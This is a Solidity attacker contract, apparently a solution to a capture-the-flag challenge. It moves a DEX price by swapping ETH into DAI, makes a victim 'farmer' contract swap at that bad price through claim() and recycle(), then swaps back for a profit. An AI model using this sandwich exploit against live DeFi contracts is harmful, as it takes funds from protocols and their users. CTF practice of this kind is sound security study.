//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Setup.sol";
import "hardhat/console.sol";

contract FarmerAttackerIballes{

    Setup private setup;
    CompDaiFarmer private farmer;
    CompFaucet private faucet;
    UniRouter private router;
    WETH9 private weth;
    ERC20Like private dai;
    CERC20Like private cdai;
    ERC20Like private comp;

    constructor(address _setup){
        setup = Setup(_setup);
        farmer = CompDaiFarmer(setup.farmer());
        faucet = CompFaucet(setup.faucet());
        router = UniRouter(setup.ROUTER());
        weth = WETH9(setup.WETH());
        dai = ERC20Like(setup.DAI());
        cdai = CERC20Like(setup.CDAI());
        comp = ERC20Like(setup.COMP());
    }

    function attack() payable external{
        weth.deposit{value: msg.value}();
        weth.approve(address(router), msg.value);
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(dai);
        uint[] memory amounts = router.swapExactTokensForTokens(msg.value, 0, path, address(this), block.timestamp);
        console.log("for 5eth obtained %s dai", amounts[1]);

        // 4980971082304144538
        // 4970048294654775279

        farmer.claim();
        farmer.recycle();

        uint256 amount = dai.balanceOf(address(this));
        dai.approve(address(router), amount);
        address[] memory pathBack = new address[](2);
        pathBack[1] = address(weth);
        pathBack[0] = address(dai);
        uint[] memory amountsBack = router.swapExactTokensForTokens(amount, 0, pathBack, address(this), block.timestamp);
        console.log("obtanied back %s eth", amountsBack[1]);
    }
        

    receive() external payable {}
}